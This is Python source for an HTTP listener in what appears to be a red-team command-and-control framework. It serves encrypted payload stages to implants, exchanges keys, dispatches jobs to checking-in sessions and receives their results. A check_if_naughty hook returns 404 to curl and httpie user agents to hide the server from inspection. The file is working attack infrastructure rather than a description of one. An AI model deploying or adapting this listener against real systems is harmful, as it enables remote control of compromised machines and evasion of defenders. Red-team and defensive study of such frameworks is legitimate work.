import ssl
import sys
import asyncio
import os
import logging
import core.state as state
import core.events as events
from core.listener import Listener
from core.session import Session
from core.utils import get_ipaddress, gen_random_string
from pprint import pprint
from quart import Quart, Blueprint, request, Response
from quart.logging import default_handler, serving_handler


class STListener(Listener):
    def __init__(self):
        Listener.__init__(self)
        self.name = 'http'
        self.author = '@byt3bl33d3r'
        self.description = 'HTTP listener'

        self.options = {
            # format:
            #   value_name : {description, required, default_value}

            'Name': {
                'Description'   :   'Name for the listener.',
                'Required'      :   True,
                'Value'         :   'http'
            },
            #'StageURL': {
            #    'Description'   :   'URL for staging.',
            #    'Required'      :   True,
            #    'Value'         :   f"https://{get_ipaddress()}"
            #},
            'BindIP': {
                'Description'   :   'The IPv4/IPv6 address to bind to.',
                'Required'      :   True,
                'Value'         :   get_ipaddress()
            },
            'Port': {
                'Description'   :   'Port for the listener.',
                'Required'      :   True,
                'Value'         :   80
            }
        }

    def run(self):

        """
        While we could use the standard decorators to register these routes, 
        using add_url_rule() allows us to create diffrent endpoint names
        programmatically and pass the classes self object to the routes
        """

        loop = asyncio.get_event_loop()

        http_blueprint = Blueprint(__name__, 'http')
        http_blueprint.before_request(self.check_if_naughty)
        #http_blueprint.after_request(self.make_normal)

        http_blueprint.add_url_rule('/<uuid:GUID>', 'key_exchange', self.key_exchange, methods=['POST'])
        http_blueprint.add_url_rule('/<uuid:GUID>', 'stage', self.stage, methods=['GET'])
        http_blueprint.add_url_rule('/<uuid:GUID>/jobs', 'jobs', self.jobs, methods=['GET'])
        http_blueprint.add_url_rule('/<uuid:GUID>/jobs/<job_id>', 'job_result', self.job_result, methods=['POST'])

        # Add a catch all route
        http_blueprint.add_url_rule('/', 'unknown_path', self.unknown_path, defaults={'path': ''})
        http_blueprint.add_url_rule('/<path:path>', 'unknown_path', self.unknown_path, methods=['GET', 'POST'])

        self.app = Quart(__name__)

        logging.getLogger('quart.app').setLevel(logging.DEBUG if state.args['--debug'] else logging.ERROR)
        logging.getLogger('quart.serving').setLevel(logging.DEBUG if state.args['--debug'] else logging.ERROR)

        #serving_handler.setFormatter('%(h)s %(p)s - - %(t)s statusline: "%(r)s" statuscode: %(s)s responselen: %(b)s protocol: %(H)s')
        #logging.getLogger('quart.app').removeHandler(default_handler)

        self.app.register_blueprint(http_blueprint)
        self.app.run(host=self['BindIP'],
                     port=self['Port'],
                     debug=False,
                     use_reloader=False,
                     #access_log_format=,
                     loop=loop)

    async def check_if_naughty(self):
        try:
            headers = request.headers['User-Agent'].lower()
            if 'curl' in headers or 'httpie' in headers:
                return '', 404
        except KeyError:
            pass

    async def make_normal(self, response):
        #response.headers["server"] = "Apache/2.4.35"
        return response

    async def unknown_path(self, path):
        self.app.logger.error(f"Unknown path: {path}")
        return '', 404

    async def key_exchange(self, GUID):
        data = await request.data
        pub_key = self.dispatch_event(events.KEX, (GUID, request.remote_addr, data))
        return Response(pub_key, content_type='application/xml')

    async def stage(self, GUID):
        stage_file = self.dispatch_event(events.ENCRYPT_STAGE, (GUID, request.remote_addr))

        if stage_file:
            self.dispatch_event(events.SESSION_STAGED, f'Sending stage ({sys.getsizeof(stage_file)} bytes) ->  {request.remote_addr} ...')
            return Response(stage_file, content_type='application/octet-stream')

        return '', 400

    async def jobs(self, GUID):
        self.app.logger.debug(f"Session {GUID} ({request.remote_addr}) checked in")
        job = self.dispatch_event(events.SESSION_CHECKIN, (GUID, request.remote_addr))
        if job:
            return Response(job, content_type='application/octet-stream')

        self.app.logger.debug(f"No jobs to give {GUID}")
        return '', 200

    async def job_result(self, GUID, job_id):
        data = await request.data
        self.app.logger.debug(f"Session {GUID} posted results of job {job_id}")
        self.dispatch_event(events.JOB_RESULT, (GUID, job_id, data))

        return '', 200
